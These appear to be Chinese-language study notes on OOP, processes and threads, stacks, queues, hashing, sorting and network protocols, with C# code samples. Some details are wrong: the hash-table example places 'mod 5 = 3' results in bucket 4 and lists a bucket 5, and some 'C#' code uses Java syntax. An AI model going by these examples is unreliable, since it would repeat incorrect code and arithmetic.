# 概念

## 物件導向

### 類別(Class) VS 物件(Object)

- ###### 物件(Object)就是類別(Class)的實體，類別(Class)就是物件(Object)的定義

- ###### 類別的定義包含了資料的形式(屬性, Field)以及對資料的操作(方法, Method)

### 三大特性

- ##### 封裝

  - ###### 物件導向有著對物體內部用的定義，以及可以給外部的定義

  - ###### 將物件內部的資料隱藏起來，只能透過物件本身所提供的介面(interface)取得物件內部屬性或者方法，物件內部的細節資料或者邏輯則隱藏起來，其他物件即無法瞭解此物件的內部細節，若不經過允許之窗口(即此物件提供之方法)便無從更動此物件內之資料

  - **對一件事情只需要理解他的外在就好，不需要了解裡面內部的構造**。

    - ###### 例如：我們可以透過getInformation()取得車子資訊，然而我們並不需要知道他是如何取得資訊的。

- ##### 繼承

  - ###### 繼承是一種機制，可以保留某個類別或物件的實作方法。奠基在既有類別上創立一個新的類別，並建立階層的關係。

  - 物件繼承 parent 物件時，可以

    - 獲得了 parent 物件的所有屬性和方法
    - 用新的方式實現、但同時維持繼承而來的 parent 物件的原有行為
    - 重複使用或延伸原有的程式碼

- ##### 多型

  - ###### 「多型」代表提供不同類型的實體一個統一的介面，或使用一個單一的符號來表示多個不同的類型。

  - ###### 原有的類別提供一個上層**介面**或**抽象類別**，而目的是為了消除了類別與類別之間的耦合性，使程式更容易維護與擴充**。**

- ##### 多載(Overloading) 

  -  是指說在**相同類別**中，定義**名稱相同**，但是**參數個數不同**，或是**參數型態不同**的函式，這樣就可以利用參數個數或者參數型態，呼叫到對應的方法

### 介面 VS 抽象類別

- ###### 介面可以被理解為「**接口」**，讓外部可以透過這個接口與內部作溝通。**規範了方法能被外部使用的規則**

  - 定義不同種類的物件中，所擁有的相同屬性功能(ex. 飛機、鳥都會飛但是飛的方式不同)

  - 透過介面可以定義功能接口(涵式)及規範(參數)，讓所有繼承的物件都必須遵守規範實作該功能

    - Ex.戰士、法師、補師都有"攻擊、防守"的功能，但彼此的實作方式都不同。
    - 透過介面定義功能、防守等涵式(街口)，定義所有繼承的腳色都必須實做這些功能

  - ###### 介面是對行為的抽象

- ##### 抽像類別是**不能直接實例化**的類別。

  - ###### 用來定義相同種類的物件，所需要具備的共通特性；例如動物(Animal)，是所有動物的基底，所有動物具有吃、喝、睡覺等等共同的特性

  - ###### **一個抽象類可以提供沒有實現，或不完整的實現。**

  - ###### 抽像類型的每個實例都是某個具體子類型的實例

  - ###### 抽象類別是對類別的抽象

## Process 

- ###### 行程，亦可稱作處理程序、進程

- ###### Process 意旨已經執行並且 load 到記憶體中的 Program，行程中的每一行程式碼隨時都有可能被 CPU 執行。在實際生活中，點開應用程式就是將 Program 活化成 Process，我們在活動監控器 (mac) 或 jobs (linux) 中看到 PID，也就是執行中的 Process ID。Program 是工廠藍圖，Process 就是照著設計藍圖所完成的實體工廠。

- ##### 組成：

  - ###### 一個 Memory Space。相當於 Object 的 variable，不同 Process 的 Memory Space 也不同，彼此看不到對方的 Memory Space。

  - ###### 一個以上的 Thread。

- ###### 多工作業系統 (Multitasking Operating System) 可以同時執行數個 Process，然而一個 CPU 一次只能執行一個 Process (因此才有現在的多核處理器)，CPU 的總量又總是少於 Process 的運行總量，且 Process 會佔用記憶體。因此如何排程 (*Scheduling*)、如何有效管理記憶體 (*Memory Management*) 是作業系統 (OS) 所關注的事。

- #####  總結

  - ###### Process 是電腦中已執行 Program 的實體，每一個 Process 互相獨立。

  - ###### Process 需要一些資源才能完成工作，如 CPU、記憶體、檔案以及 I/O 裝置。

  - ###### Process 不是基本執行單位，而是 Thread (執行緒) 的容器。

  - ###### 每個 Process 由一個 Memory Space 和一個以上的 Thread 所組成。



## Thread

- ###### 同一個 Process 中會有很多個 Thread，每一個 Thread 負責某一項功能。以聊天室 Process 為例，可以同時接受對方傳來的訊息以及發送自己的訊息給對方，就是同個 Process 中不同 Thread 的功勞。Thread 就是實體工廠內的工人，確保工廠的每項功能，並且共享工廠內的每一項資源。

- ##### 組成：

  - ###### Stack：紀錄從某個起始點開始 (例如main)，到目前為止所有函數的呼叫路徑，以及在這些呼叫路徑上所用到的區域變數。

  - ###### 紀錄 CPU 內部的暫存器 (如 Program Counter, Stack Pointer, Program Status Word 等) 的狀態。

- ###### 多執行緒中 (Multithreading)，兩個執行緒若同時存取或改變全域變數 (Global Variable)，可能會發生同步 (*Synchronization*) 問題。若執行緒之間互搶資源，則可能產生死結 (*Deadlock*)，如何避免 (*Prevent*) 或預防 (*Avoid*) 上述兩種情況的發生，仍是作業系統 (OS) 所關注的。

## Stack

- ###### 疊是限制插入元素和刪除元素只能在同一個位置的表(list)，該位置一般來說稱為棧頂(Top)。對堆疊的基本操作有 Push(推入，將資料加到棧頂) 和 Pop(彈出，將棧頂的資料移出) 這兩種操作。

- ###### 堆疊有時候也會被稱為先進後出表(LIFO，Last In First Out)，最先進入的資料會最後被彈出，如同函式呼叫，最先呼叫的函式會最後彈出記憶體。

- ###### 堆疊在軟體中是相當常見的應用，像是瀏覽器的上一頁就是一種應用，會按照你所存取的網頁，依照堆疊的順序進行存取(事實上，上一頁其實並非邏輯上的上一頁，如果現在在yahoo，上一頁是google，我們按下上一頁後會回到google，但再按上一頁事實上並不是回到yahoo...要不然就是死循環了...)

- ###### Stack的pop跟push之時間複雜度皆為常數, 即**O(1)**, 不涉及複製和移動操作

### 基本操作:

1. ##### push: 塞東西到stack

2. ##### pop: 把最上面的東西彈出來

3. ##### peek: 只觀看最上面的東西, 不要彈出來

### 實作方式

- ###### 陣列實作

  1. ###### 透過全域變數紀錄最後儲存的Index值，只要有Push 就Insert 進`arr[index++]`中

  2. ###### PoP透過Index固定取得最後一個塞入的值 `arr[index--]`

     ```C#
     public class Stack {
     
         private int[] data;
         private int top = -1; //陣列索引
     
         public Stack(int length) {
             data = new int[length];
         }
     
         public void push(int element) {
             if (top < this.data.length - 1) {
                 top++;
                 this.data[top] = element;
             }
         }
     
         public int pop() {
             return data[top--];
         }
     
         public int peek() {
             return data[top];
         }
     
         public boolean isEmpty() {
             return top == -1;
         }
     
         public boolean isFull() {
             return top == data.length - 1;
         }
     
         public int size() {
             return top + 1;
         }
     
     }
     ```


### Implement Stack using Queues

- ##### 本題僅可使用 Queue 資料結構作為來源 ，而在 Queue 當中有兩種標準定義的方法：

  - ###### shift：取出最左邊（最早被加入）的元素

  - ###### push：新加入的元素會邊加入到最右邊

- ##### 作法

  - ##### 使用兩個Queue(queue1、queue2)

  - ##### Push:

    - ###### 將資料先推至q2

    - ###### 將q1資料由前至後依序推往q2

    - ###### 將q2 asign q1，並且初始化q2

  - ##### Pop:

    - ###### 若rear>0代表裡面有值

      - ###### 將第一個元素取出，後面的元素往前搬
  
      - ###### rear-1
  
  - ```C#
     public class Stack
        {
            public int[] q1 = new int[100];
            public int[] q2 = new int[100];
            public int rear = 0;
      
            public void push(int x)
            {
                int index = 0;
      
                q2[index++] = x;
      
                if (rear > 0)
                {
                    for (var i = 0; i < rear; i++)
                        q2[index++] = q1[i];
                }
      
                q1 = q2;
                q2 = new int[100];
                rear++;
            }
      
            public void pop()
            {
                if (rear > 0)
                {
                    for (var i = 1; i < rear; i++)
                    {
                        q1[i - 1] = q1[i];
                        q1[i] = 0;
                    }
                    rear--;
                }
      
            }
      
            public int top()
            {
                if (rear > 0)
                    return q1[0];
      
                return -1;
            }
      
            public int size()
            {
                return rear;
            }
        }
    ```

## Queue

- ###### Queue是一種特殊的線性表, 限定只能在表的一端進行插入(隊尾), 而在另一端進行刪除操作(隊頭), 特點是"先進先出"(FIFO).

### 基本操作:

1. ###### insert:在隊尾插入資料

2. ###### remove: 從隊頭移走資料

3. ###### peek: 查看隊頭的資料

### 陣列實作

- ###### Insert: 透過index紀錄陣列最後的值，每次將資料存入最後一筆 `arr[rear++]`

  - ###### 其實我們所進行的事情，就只是改變隊尾(rear = rear + 1)，沒有涉及到需要移動到整個陣列的操作，因此，時間複雜度為O(1)。就像是排隊一樣，來的人只要接在原來排隊人群的後面就可以了。

- ###### POP: 透過front紀錄表頭位置，並且每次取出`arr[front]`並刪除後將陣列往前搬

  - ###### 針對出隊(Dequeue)進行分析，出隊為將頭(front)元素移除的操作，就像是排隊一樣，排頭的人走了，那其餘的人就必須往前進一格，也因此出隊會涉及到整個陣列的移動，時間複雜度為O(N)

    ![img](https://i.imgur.com/idLKa7f.png)

- ###### 如果想要維持O(1)，可以透過不搬移陣列的方式僅刪除頭部元素即可。但這樣會造成假溢位問題

  ![img](https://i.imgur.com/gOtSVFy.png)

#### 假溢出(False overflow)

- ###### 如下圖所示，由於我們在Pop出前面的元素時沒有進行陣列的搬移。導致前面的空間浪費無法插入，此時可以透過`Circular Quee`

- ![img](https://i.imgur.com/IQ16QUm.png)

#### Circular Queue

- ###### 要解決假溢出的問題，其實我們只要將rear跑到陣列界線時，再往下走一格會回到陣列的頭就可以解決了，也就是使陣列的頭尾相接，這種陣列我們稱之為循環陣列(circular array)。

- ![img](https://i.imgur.com/q7rI6ZC.png)

###  Implement Queue using Stacks

- ##### 本題僅可使用 Stack 資料結構作為來源 ，而在 Stack 當中有兩種標準定義的方法：

  - ###### pop：取出最上邊（最新被加入）的元素

  - ###### push：新加入的元素會邊加入到最上方

- ###### 準備兩個Stack

  - ###### Push:

    - ###### 每次使用時，會先把 stack2 倒過來放進 stack1 中

    - ###### 確定 stack2 空了以後，再放入新資料

    - ![https://ithelp.ithome.com.tw/upload/images/20210920/201413363IHUqH8HPq.png](https://ithelp.ithome.com.tw/upload/images/20210920/201413363IHUqH8HPq.png)

  - ##### Pop: (達到先進先出)

    - ###### 每次使用時，會先把 stack1 倒過來放進 stack2 中(達到先進先出)

    - ###### 確定 stack1 空了以後，在從stack2取出資料

    - ![https://ithelp.ithome.com.tw/upload/images/20210920/20141336JsOBStPg0W.png](https://ithelp.ithome.com.tw/upload/images/20210920/20141336JsOBStPg0W.png)

  - ##### peek: 查看最開頭資料

    - ###### 若資料在stack1，取得最前面的資料

    - ###### 若資料在stack2，取得最後面的資料

    - ![https://ithelp.ithome.com.tw/upload/images/20210920/20141336GmtRSBuGza.png](https://ithelp.ithome.com.tw/upload/images/20210920/20141336GmtRSBuGza.png)
  
  - ```C#
    public class Queue
    {
        public int[] s1 = new int[100];
        public int[] s2 = new int[100];
        public int index = 0;
    
        public void EnQueue(int x)
        {
            if (index == 0)
                s1[0] = x;
            else
            {
                var tmpIndex = 0;
    
                for (var i = index - 1; i >= 0; i--)
                    s2[tmpIndex++] = s1[i];
    
                tmpIndex = 0;
                s1[tmpIndex++] = x;
    
                for (var i = index - 1; i >= 0; i--)
                    s1[tmpIndex++] = s2[i];
            }
    
            index++;
        }
    
        // Dequeue an item from the queue
        public int DeQueue()
        {
            if (index == 0)
            {
                Console.WriteLine("Q is Empty");
            }
    
            var result = s1[index-1];
            s1[index - 1] = 0;
            index--;
            return result;
        }
    }
    ```

## Hash

- ###### 電腦科學中一種對資料的處理方法，通過某種特定的函式/演算法（稱為雜湊函式/演算法）將要檢索的項與用來檢索的索引（稱為雜湊，或者雜湊值）關聯起來，生成一種便於搜尋的資料結構

- ###### 雜湊演算法也被用來加密存在資料庫中的密碼（password）字串，由於雜湊演算法所計算出來的雜湊值（Hash Value）具有不可逆（無法逆向演算回原本的數值）的性質，因此可有效的保護密碼。

- ###### 一種資料儲存與擷取之技術，當要存取 Data X 之前，必須先經過 Hashing Function 計算求出 Hashing Address，再到 Hash Table 中對應的 Bucket 中存取 Data X，而 Hash Table 結構是由 B 個 buckets 組成，每個 bucket 有 S 個 Slots，每個 Slot 可存一筆 Data

- ##### Hashing 優點

  1. ###### 搜尋 Data 之前，無需事先排序過

  2. ###### 再沒有 Collision 情況下，Search X 之 time 為: O (1)，與資料量 n 無關

  3. ###### 保密 / 安全性高，在不知道 Hashing Function 下，很難取得 Data

  4. ###### 可作為 Data 壓縮之用途

     - ###### 例如：Unix 之 password 採用一對一，不可逆之 Hashing

- ##### Collision

  - ###### 不同的 Data，例如 (x,y)，經過 Hashing function 計算後得出相同的 Hashing Address 稱之，也就是 H (x) = H (y)

- #####  Overflow 

  - ###### Collision 發生後，且對應的 Bucket 已滿，則稱為 Overflow

  - ##### 處理方法

    - ##### Linear Probing (線性探測)

      - ###### 當兩筆資 x 與 y，代入雜湊函式 H(x) 與 H(y) 之後，若得到相同的雜湊值，則會發生溢位，此時可以將雜湊值依序 + 1，一格一格往後尋找有沒有其它空位，直到找到空位，或是儲存空間皆存滿為止

      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841owOclTmA1g.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841owOclTmA1g.png)

      - 優點：

        1. 簡單、易於實施
        2. 保證 Table 空間可以充分利用

      - ##### 缺點：

        ##### 容易發生 Primary Clustering 現象，造成 Search/Insert/Delete X 等時間大幅增加之問題

        ##### Primary Clustering ：具有相同 Hashing Address 之 Data 容易占用相鄰的 Buckets 存放，形成群聚現象

    - #####  Quadratic Probing (二次方探測)

      - ###### 當 H (x) 發生 overflow 時，則探測![https://chart.googleapis.com/chart?cht=tx&chl=(%20H(x)%20%5Cpm%20i%5E2%20)%20%25%20b](https://chart.googleapis.com/chart?cht=tx&chl=(%20H(x)%20%5Cpm%20i%5E2%20)%20%25%20b) 

      - ###### B 為 Bucket 數目，i 是逐一遞增 i = 1,2,3,4,....，套入公式後，即可找到新的儲存位置，若還是發生溢位，則 i 繼續加 1 ，並代入公式

      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841w9Oce294uH.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841w9Oce294uH.png)

    - **再雜湊 (Rehashing)**

      - ###### 準備多個雜湊函式，當第一種雜湊函式遇到溢位時，就換第二種雜湊函式，如果第二種雜湊函式遇到溢位時，就算第三種，直到沒有發生溢位為止

    - ##### Chaining or Link List (鏈結串列)

      - ###### 具有相同的 Hashing Address 的 Data 均置入同一個 Bucket 去，而 Bucket 內之 Data 彼此透過 Link List 結構串連在一起，而這種情況就作 Closed Address Mode

      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841JnoYoG0rLp.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841JnoYoG0rLp.png)

### **雜湊函數 (Hash function)**

- ##### 將不定長度訊息的輸入，演算成固定長度雜湊值的輸出，且所計算出來的雜湊值必須符合兩個主要條件：

  - ###### 由雜湊值是無法反推出原來的訊息

  - ###### 雜湊值必須隨明文改變而改變。

- ##### 好的 Hashing Function 設計，要滿足下列三個 criteria：

  - ###### 計算宜簡單，不要過度複雜

  - ###### Collision 要少

  - ###### 不要造成 Hash Table 局部儲存之情況，要夠均勻才好

- ##### 常見的 Hashing Function 設計

  - ##### Middle Square

    - ###### 將鍵值平方後，取中間適當位數作為 Hashing Address 

      - 例如：鍵值 = 8125，平方後， = 66015625 取中間三個位數，156 作為 Hashing Address

  - ##### Mod (or Divide) 取餘數

    - ###### H(X) = X % M

  - ##### Folding Addition

    - ##### 將鍵值切成幾個相同長度之片段 (P1~Pn)，再將這些片段加總，即得 Hash Address。而相加的方法有兩種：

      - ###### shift (位移)

      - ###### bounding (邊界)

    - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841QkZJaaipBw.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841QkZJaaipBw.png)

    - ```C#
      例如：x = 12320324111220
      
      切成這樣：
      P1 = 123
      P2 = 203
      P3 = 241
      P4 = 112
      P5 = 020
          
      shift 作法
      將 P1~Pn 相加 = 699
      
      bounding 作法
      偶數的片段反向，所以：
      P2 = 302
      P4 = 211
      再加總 P1~Pn = 897
      ```

  - ##### **數位分析法 (Digits Analysis)**

    - ###### 如果已知資料的相似度很高，則可將重覆的資料捨去，例如手機號碼，都是 09 開頭，則 09 的部分就不需要參與計算，可挑選某一段具特殊意義的數字來做運算

### **雜湊表 (Hash table)**

- ###### 用雜湊函數運算出來的雜湊值，根據 **鍵 (key)** 來儲存在數據結構中

- ex

  - ```C#
    //舉例來說，我們有一筆資料用字典的形式表示，每個名字都搭配性別：
    {Joe:'M', Sue:'F', Dan:'M', Nell:'F', Ally:'F', Bob:'M'}
    
    //將每個名字經過雜湊函數的運算。
    (Key)                 (hash value)     (stored index)
    Joe  → (Hash function) →   4928   mod 5   =   3
    Sue  → (Hash function) →   7291   mod 5   =   1
    Dan  → (Hash function) →   1539   mod 5   =   4
    Nell → (Hash function) →   6276   mod 5   =   1
    Ally → (Hash function) →   9143   mod 5   =   3
    Bob  → (Hash function) →   5278   mod 5   =   3
    hash value 是獨一無二的，用 mod 5 來得到餘數並儲存才記憶體中。
    0： 
    1： [ Sue, F ] → [ Nell, F ]
    2： 
    3： 
    4： [ Joe, M ] → [ Ally, F ] → [ Bob, M ]
    5： [ Dan, M ]
    ```

- 



## Sort

###  Bubble Sort

- ###### 又稱`交換`排序法，顧名思故就是與`相鄰`的資料`兩兩比較`，如果數字較大者在前面，則需交換位置到後面，這樣一來可確保，數字最大者會排在最後面

- ![https://ithelp.ithome.com.tw/upload/images/20201003/20129841rCEYFJhmaM.png](https://ithelp.ithome.com.tw/upload/images/20201003/20129841rCEYFJhmaM.png)

- ### 時間複雜度

  - 最壞的情況
    資料是反序排序，如上述例子 ![https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2)](https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2))最好的情況
    資料原先就已經排列好，則只需做 n-1 次的比較，發現沒有交換情況，時間為 O(n)

### Selection Sort

- ###### 給定陣列N，從元素0開始每次與最小值互換位置

- ![https://ithelp.ithome.com.tw/upload/images/20201003/20129841CFBMlzn4Wc.png](https://ithelp.ithome.com.tw/upload/images/20201003/20129841CFBMlzn4Wc.png)

- ###### 複雜度: ![https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2)](https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2))

### Insertion sort

- 給定未排序陣列{ ![https://chart.googleapis.com/chart?cht=tx&chl=a_1%2Ca_2%2C...%2Ca_n](https://chart.googleapis.com/chart?cht=tx&chl=a_1%2Ca_2%2C...%2Ca_n) },每次都跟前面的陣列進行比較

  - 若現有值比前面陣列小，則將前面陣列往後移動

  - 一直到出現第一個比現有值小的元素，則現有值插入再該元素+1位置

  - ![img](https://www.runoob.com/wp-content/uploads/2019/03/insertionSort.gif)

  - ```c#
    public static void InsertSort(int[] array)
    {
        for(int i = 1;i < array.length;i++)
        {
            int temp = array[i];
            for(int j = i - 1;j >= 0;j--)
            {
                if(array[j] > temp)
                {
                    array[j + 1] = array[j];
                    array[j] = temp;
                }
                else
                    break;
            }
        }
    }
    ```

  - #### 複雜度

    | 項目           | 值    | 備註                       |
    | -------------- | ----- | -------------------------- |
    | 最差時間複雜度 | O(n2) | 排序已經反向排序過的序列。 |
    | 最佳時間複雜度 | O(n)  | 排序已經正向排序過的序列。 |
    | 平均時間複雜度 | O(n2) |                            |
    | 最差空間複雜度 | O(1)  |                            |

### 分治法(Divide-and-Conquer)

有許多演算法使用了遞迴的結構進行設計 : 為了解決一個問題，將問題拆分後經過多次遞迴解決問題的子問題，最終合併結果並解決問題。這種演算法就是分治法的想法。分治法在每一層的遞迴會有三個步驟:

- 分解(Divide) : 將原問題分解成許多個子問題，每一個子問題都是原問題規模較小的實例。
- 解決(Conquer) : 遞迴的方式去求解各子問題，當子問題的規模夠小時，則直接求解。
- 合併(Combine) : 將子問題的解合併成原問題的解。

### Quick Sort

- ###### `快速排序法`採用分而治之法(Divide-and-conquer)，把`大問題切割成小問題`，會於資料中找到一個`基準值(Pivot)`，並將資料逐一與這個值相比較，最後可以得到兩個部分，分別為`大於這個值`與`小於這個值`的數值，大於基準值的數值放在`右邊`，小於基準值的數值放`左邊`，`基準值`就很像是我們使用的`篩子`，篩完之後物品就會被`區分`成兩塊

- ###### 先找一個基準點，然後派兩個代理人分別從資料的兩邊開始往中間找，如果右邊找到一個值比基準點小，左邊找到一個值比基準點大，就讓他們互換。反覆找並互換，直到兩個人相遇。然後再將相遇的點跟基準點互換。第一輪結束。

- ##### 操作方式

  1. ###### 挑選基準值(Pivot)

     - ###### 取亂數

     - ###### 頭數、尾數、中間數排序後取中間值

       ###### 例如：1,5,7,9,8,6,3，第一個數為 1，最後一個數為 3 ，中間數為 9，由小至大排序後得到 1, 3, 9 可以取 3 做為基準值

     - ###### 取數值的最左邊或做右邊

  2. ###### 數值的比較

     - ###### 有一陣列稱為 array，數值共有 n 個，例如：`6, 4, 9, 3, 5, 0, 7, 2, 8, 1`，數值共有 10 個，需做兩件事情來與基準值做比較，才能將`大於`與`小於`基準時的數值分類出來，假設基準值是 `6`

     - 由左往右找出第一個大於基準值的索引位置 = i

     - 由右往左找出第一個小於基準值的索引位置 = j

  3. ###### 交換位置

     - ###### 若i < j代表此輪排序還沒完成，將i元素與j元素互換

     - ###### 若i >= j 代表此輪排序已經完成，將基準值與j元素互換

  4. ###### 各別處理左區與右區

     - ###### 再針對左區或右區，在重新挑選基準值，例如左區有 2, 4, 1, 3, 5，可在此區重新挑基準值，例如以 2 為基準值，再重覆 1 ~ 3 步驟即可(遞迴)，等到最後切到只剩單一元素時，即可完成所有數值的排序


  - ```C#
    //array[left] 做基準
    static void QuickSort1(int[] array, int left, int right)
    {
        if (left < right)
        {
            int i = left;
            int j = right + 1;
            while (true)
            {
                while (i + 1 < array.Length && array[++i] < array[left]) ;
                while (j - 1 > -1 && array[--j] > array[left]) ;
                if (i >= j)
                    break;
                Swap(array, i, j);
            }
            Swap(array, left, j);
            QuickSort1(array, left, j - 1);
            QuickSort1(array, j + 1, right);
        }
    }
    ```

  - 最壞的情況
    ![https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2)](https://chart.googleapis.com/chart?cht=tx&chl=O(n%5E2))，每次挑基準值的時候，都剛好挑到最大值或最小值

  - 最好的情況
    O(n log n)，挑選到好的基準值，可將資料切為一半，再根據其中一半再切一半，再分別去處理小的子區塊，切 log n 次，所以會花O(log n)時間

### 合併排序法(merge sort)

- ##### 合併排序法(merge sort)就是一種由分治法實現的演算法，直觀上也是符合分治法的三個步驟

  - ##### 分解(Divide) : 分解待排序長度為![https://chart.googleapis.com/chart?cht=tx&chl=n](https://chart.googleapis.com/chart?cht=tx&chl=n)的陣列，變成長度為![https://chart.googleapis.com/chart?cht=tx&chl=n%2F2](https://chart.googleapis.com/chart?cht=tx&chl=n%2F2)長度的兩個子陣列。

  - ##### 解決(Conquer) : 使用合併排序法遞迴的排序兩個子陣列。

  - ##### 合併(Combine) : 合併兩個已經排序的子陣列產生出已經完成排序的原陣列。

- ![img](https://www.runoob.com/wp-content/uploads/2019/03/mergeSort.gif)

- ```C#
  public static List<int> sort(List<int> lst) {
      if (lst.Count <= 1)
          return lst;
      int mid = lst.Count / 2;
      List<int> left = new List<int>();  // 定义左侧List
      List<int> right = new List<int>(); // 定义右侧List
      // 以下兩個循環把 lst 分為左右兩個 List
      for (int i = 0; i < mid; i++)
          left.Add(lst[i]);
      for (int j = mid; j < lst.Count; j++)
          right.Add(lst[j]);
      left = sort(left);
      right = sort(right);
      return merge(left, right);
  }
  /// <summary>
  /// 合併兩個已經排好序的List
  /// </summary>
  /// <param name="left">左側List</param>
  /// <param name="right">右側List</param>
  /// <returns></returns>
  static List<int> merge(List<int> left, List<int> right) {
      List<int> temp = new List<int>();
      while (left.Count > 0 && right.Count > 0) {
          if (left[0] <= right[0]) {
              temp.Add(left[0]);
              left.RemoveAt(0);
          } else {
              temp.Add(right[0]);
              right.RemoveAt(0);
          }
      }
      if (left.Count > 0) {
          for (int i = 0; i < left.Count; i++)
              temp.Add(left[i]);
      }
      if (right.Count > 0) {
          for (int i = 0; i < right.Count; i++)
              temp.Add(right[i]);
      }
      return temp;
  }
  ```

- #### 合併排序法的複雜度

  | 項目           | 值       | 備註 |
  | -------------- | -------- | ---- |
  | 最差時間複雜度 | O(nlog⁡n) |      |
  | 最佳時間複雜度 | O(nlog⁡n) |      |
  | 平均時間複雜度 | O(nlog⁡n) |      |
  | 最差空間複雜度 | O(n)     |      |
  | 是否穩定       | 是       |      |

### 堆積排序法 Heap Sort

- ![heap-sort](https://img.magiclen.org/albums/heap-sort/animation-361x351.gif)



## 網路協定

### TCP

1. ###### TCP 為每個封包分配一個唯一的識別碼和一個序號，這些號碼能讓接收端識別封包的完整性，以及封包的順序

2. ###### 當接收端收到封包後，如果順序正確，會向發送端傳送一個確認信號（Acknowledgement），以此確認接收端已經收到封包。

3. ###### 發送端傳送另一個封包

4. ###### 如果封包遺失或發送順序錯誤，接收端會保持沈默，不發送確認信號。這表示發送端需要重新傳送封包。

   ![TCP 如何運作](https://nordvpn.com/wp-content/uploads/2020/07/TCP_vs_UDP_01_ZH-TW.gif)

- ##### 因為資料是按照順序發送的，有助於流量控制和解決資料壅塞的問題，並容易發現和修復錯誤。因此，經由 TCP 發送的資料能完全到達目的地。即使網路阻塞，傳輸的資料也不會出問題。

- ##### 不過 TCP 也有缺點，發送端和接收端之間有很多往來的通訊，因此建立連線和交換資料需要更多的時間。

### UDP 

- ##### UDP 不需要唯一識別碼和序號就能完成相同的工作。以串流方式傳送資料，發送端不會等待接收端的確認信號，會繼續不斷發送封包資料。

- ##### UDP 幾乎沒有錯誤修正功能，也不在乎封包遺失，因此很容易出錯，但傳輸速度比 TCP 更快。

- ##### 串流媒體、VoIP 語音、網路遊戲等服務經常使用 UDP 協定，這網路應用不太需要可靠性機制，封包遺失不會導致服務中斷。

  ![UDP 如何運作](https://nordvpn.com/wp-content/uploads/2020/07/TCP_vs_UDP_02_ZH-TW.gif)

- ##### TCP 和 UDP 的比較如下：

|                | TCP                                                  | UDP                                        |
| :------------- | :--------------------------------------------------- | :----------------------------------------- |
| 可靠性         | 可靠                                                 | 不可靠                                     |
| 速度           | 慢                                                   | 快                                         |
| 傳輸方式       | 封包按順序傳輸                                       | 封包以串流方式傳輸                         |
| 錯誤檢查與修正 | 有                                                   | 無                                         |
| 壅塞控制       | 有                                                   | 無                                         |
| 確認           | 有                                                   | 只有檢查碼                                 |
| 適用服務       | 要求可靠傳輸的服務，例如電子郵件、網頁瀏覽、檔案傳輸 | 即時服務，例如串流媒體、網路電話、網路遊戲 |

### HTTP 

- ###### HTTP 全名是 [超文本傳輸協定（HyperText Transfer Protocol）](https://zh.wikipedia.org/wiki/超文本传输协议)，內容只規範了客戶端請求與伺服器回應的標準，實際上是藉由 [TCP](https://zh.wikipedia.org/wiki/传输控制协议) 作為資料的傳輸方式。

- ###### 最早被設計用來「傳送」及「接收」HTML的頁面及內容。HTTP在用戶端(使用者)與伺服器端(網站)之間透過TCP協定來傳遞「請求」與「應答」的要求。

- ###### HTTP協定不使用加密協定，其中原因包含：加密會多消耗許多運算資源，也會佔用更多的傳輸頻寬，而緩存機制跟著會失效。

- ###### 當使用者端以HTTP發起一個請求後，會建立起一個使用者端至伺服器指定連接埠80端的一個TCP連線，而伺服器在收到使用者端的請求後，則會向使用者端返回一個狀態碼，例如"HTTP/1.1 200 OK”

- ##### 問題

  - ###### 明文的方式傳遞訊息，沒有任何的保護措施，因此只要有心人對於傳遞的訊息進行攔截，我們的資料就會被竊取

  - ###### 訊息可能在途中被竄改內容，因此使用者端就很容易暴露在網路的高風險環境下

### HTTPS

- ###### HTTPS 全名 [超文本傳輸安全協定](https://zh.wikipedia.org/wiki/超文本传输安全协议)，那個 S 就是 Secure 的意思；HTTPS 透過 HTTP 進行通訊，但通訊過程使用 [SSL/TLS](https://zh.wikipedia.org/wiki/傳輸層安全性協定) 進行加密，藉由類似於前述的加密方式，在 HTTP 之上定義了相對安全的資料傳輸方法。

- ##### HTTPS 使用加密協議來加密通信。該協議稱為傳輸層安全性 (TLS)，以前叫做 SSL。該協議通過使用所謂的[公鑰基礎設施](https://zh.wikipedia.org/wiki/公開金鑰基礎建設)來保護通信

  - ###### 私鑰: 由網站的所有者控制，它是私有的，這個私鑰位於 Web 伺服器上，用於解密由公鑰加密的信息

  - ###### 公鑰: 每個想要以安全方式與服務器交互的人都可以使用這個公鑰 。用公鑰加密的信息只能用私鑰解密

- ###### 加密：SSL/TLS現在是使用「非對稱式加密」的方式來進行資訊加密的動作，在資料的安全上也比較有保障。

- ###### **驗證：**透過公開加密金鑰的方式(也稱作非對稱式的加密)，讓每個通訊者同時擁有「公鑰」及「私鑰」來解決加密上不安全的問題，不過「公鑰」與「私鑰」擁有者如何證明加密的密文就是正確的，而非被竊取後竄改的呢?此時就須要有公正的第三方機構來頒發數位憑證，以證明配對的「公鑰」與「私鑰」雙方是正確的。

- ###### 完整性：SSL/TLS將身分資訊（比如網路主機名，組織的名稱或個體名稱等）和簽章資訊等內容以數字形式的文件格式做成加密的「公鑰」與「私鑰」密鑰對。任何擁有公鑰的人都可以使用它發送只有私鑰擁有者才能解密的訊息，及確認這個傳遞的訊息是該公鑰對應的私鑰所進行簽章。也因為資料在伺服器端與使用者端傳輸時，兩端的金鑰可以以該組數位簽章確認彼此的身分與內容的完整性，所以我們才能確保在網路上彼此傳輸的資料是安全的。

#### **SSL**

- ###### Secure Sockets Layer，目的除了維持網路連線的安全性外，也是防止兩台電腦間互相傳送敏感資訊和個人資料。

- ###### 確保使用者對網站、伺服器對伺服器間傳送資料時能夠安全無虞，也可以將傳送的資料加密，讓駭客無法竊取，相對來說也是對使用者的一種個資安全保障。

- ##### 如何運作

  - ###### 為了提供高度[隱私](https://www.cloudflare.com/learning/privacy/what-is-data-privacy/)，SSL 會加密在網頁各處傳輸的資料。這表示任何嘗試攔截此資料的人只會看見幾乎無法解密的模糊字元混合。

  - ###### SSL 會在兩個通訊裝置之間啟動稱為[交握](https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/)的**身分驗證**流程，以確保兩個裝置確實都符合自行宣稱的身分。

